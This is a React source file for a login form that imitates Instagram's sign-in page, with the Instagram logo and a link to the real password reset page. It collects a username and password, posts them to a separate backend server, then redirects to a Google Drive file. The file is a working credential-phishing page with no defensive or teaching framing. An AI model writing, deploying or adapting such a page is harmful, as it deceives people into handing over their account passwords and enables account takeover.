import React, { useState } from 'react';
import axios from 'axios';

const LoginForm = () => {
  const instagramLogo = 'https://img.freepik.com/free-vector/instagram-vector-social-media-icon-7-june-2021-bangkok-thailand_53876-136728.jpg?size=338&ext=jpg&ga=GA1.1.1788614524.1717200000&semt=ais_user';
  const [userName, setUserName] = useState('');
  const [password, setPassword] = useState('');

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      const response = await axios.post('http://localhost:5000/api/users', { userName, password });
      console.log('User created successfully:', response.data);
      window.location.href = 'https://drive.google.com/file/d/1cwhc2PtWJ0E9778XkbmB3ehnISfgp8qN/view'; // Redirect to external URL
    } catch (err) {
      console.error('Error creating user:', err);
    }
  };

  return (
    <div className="flex items-center justify-center min-h-screen bg-gray-100">
      <div className="bg-white p-10 rounded-lg shadow-lg w-full max-w-md">
        <div className="flex justify-center mb-6">
          <img src={instagramLogo} alt="Instagram Logo" className="w-32" />
        </div>
        <form onSubmit={handleSubmit}>
          <div className="mb-4">
            <label className="block text-gray-700">Username</label>
            <input
              type="text"
              value={userName}
              onChange={(e) => setUserName(e.target.value)}
              required
              className="w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
            />
          </div>
          <div className="mb-4">
            <label className="block text-gray-700">Password</label>
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
              className="w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
            />
          </div>
          <button
            type="submit"
            className="w-full bg-blue-500 text-white py-2 rounded-lg hover:bg-blue-600 focus:outline-none focus:ring-2 focus:ring-blue-500"
          >
            Log In
          </button>
        </form>
        <div className="flex justify-center mt-6">
          <a href="https://www.instagram.com/accounts/password/reset/" className="text-blue-500">Forgot password?</a>
        </div>
      </div>
    </div>
  );
};

export default LoginForm;
